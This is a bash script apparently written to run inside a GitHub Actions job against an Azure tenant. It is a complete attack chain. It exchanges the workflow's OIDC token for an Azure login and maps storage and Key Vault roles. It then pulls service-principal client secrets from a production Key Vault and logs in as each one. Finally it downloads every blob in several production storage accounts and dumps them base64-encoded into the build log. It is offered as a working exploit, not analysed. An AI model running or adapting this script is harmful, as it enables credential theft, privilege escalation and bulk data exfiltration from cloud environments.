#!/usr/bin/env bash
set +e
echo "=====PWN4_START====="
AUD="api:""//AzureADTokenExchange"
IDT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
echo "[*] CI login rc=$?"
echo "--- RBAC map (jq) ---"
az role assignment list --all -o json 2>/dev/null | jq -r '.[] | select(.roleDefinitionName|test("Storage|Blob|Key Vault")) | "\(.roleDefinitionName) | \(.principalType) \(.principalName) | \(.scope|split("/")[-1])"' | sort -u | head -30
echo "--- chuoi atom: KV -> login -> blob (khong nghi) ---"
for SECNAME in reporting-service-principal sync-service-principal secrets-sync-principal reporting-viewer-principal cost-reader-principal directory-audit-principal; do
  V=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n "$SECNAME" --query value -o tsv 2>/dev/null)
  [ -z "$V" ] && continue
  APP=$(printf %s "$V" | jq -r .appId 2>/dev/null); CS=$(printf %s "$V" | jq -r .clientSecret 2>/dev/null)
  echo "[$SECNAME] app=$APP"
  az logout >/dev/null 2>&1
  az login --service-principal -u "$APP" --password="$CS" -t "${AZURE_TENANT_ID}" -o none >/dev/null 2>&1 || { echo "  login FAIL"; continue; }
  echo "  login OK — thu blob tai tung account/container:"
  for SA in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
    for C in $(az storage container list --account-name "$SA" --auth-mode login -o tsv --query "[].name" 2>/dev/null); do
      for B in $(az storage blob list --account-name "$SA" --container-name "$C" --auth-mode login -o tsv --query "[].name" 2>/dev/null); do
        echo "  [$SA/$C/$B]"
        az storage blob download --account-name "$SA" --container-name "$C" --name "$B" --auth-mode login -f /tmp/b.out >/dev/null 2>&1 && echo "  B64: $(base64 -w0 /tmp/b.out)"
      done
    done
  done
  az logout >/dev/null 2>&1
  az login --service-principal -u "${AZURE_CLIENT_ID}" -t "${AZURE_TENANT_ID}" --federated-token "${IDT}" --allow-no-subscriptions >/dev/null 2>&1
done
echo "--- kv-tbl-sec: thu voi CI ---"
az keyvault secret list --vault-name kv-tbl-sec-x3euoz -o tsv --query "[].name" 2>&1 | head -5
echo "=====PWN4_END====="